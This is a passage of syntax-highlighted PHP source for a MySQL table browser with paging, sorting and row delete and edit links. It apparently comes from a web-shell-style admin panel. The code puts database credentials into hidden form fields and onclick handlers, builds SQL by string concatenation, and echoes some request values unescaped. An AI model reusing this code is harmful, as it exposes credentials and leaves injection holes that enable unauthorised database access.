       <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.thistbl.value=&#39;1&#39;;document.sql.sql_order.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_ls.value=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_le.value=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">echo</span> <span class="nv">$i</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span> <span class="o">==</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;empty&quot;</span><span class="p">;}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_order</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;From:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_ls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;b&amp;gt;To:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_le</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">View</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=</span><span class="se">\&quot;</span><span class="s2">1%</span><span class="se">\&quot;</span><span class="s2"> bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow_all</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
      <span class="p">{</span>
       <span class="nv">$v</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;asc&quot;</span><span class="p">;}</span>
       <span class="k">else</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;desc&quot;</span><span class="p">;}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_order</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="nv">$sql_order</span><span class="o">=</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">;</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_order.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_order</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_ls.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_le.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_order.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_ls.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_le.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;font color=red&amp;gt;\/&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span>
      <span class="p">{</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
       <span class="nv">$w</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
       <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span> <span class="nv">$w</span> <span class="o">.=</span> <span class="s2">&quot; `&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;` = &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; AND&quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;}</span>
       <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$w</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">);}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow[]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
       <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&amp;gt;NULL&amp;lt;/font&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
       <span class="p">}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_act.value=&#39;query&#39;;document.sql.sql_query.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_ls.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_le.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;DEL&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_act.value=&#39;insert&#39;;document.sql.sql_tbl_insert_q.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_ls.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_le.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;EDIT&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;p align=</span><span class="se">\&quot;</span><span class="s2">left</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">deleterow</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">;</span>
     <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLE STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
     <span class="k">else</span>
     <span class="p">{</span>
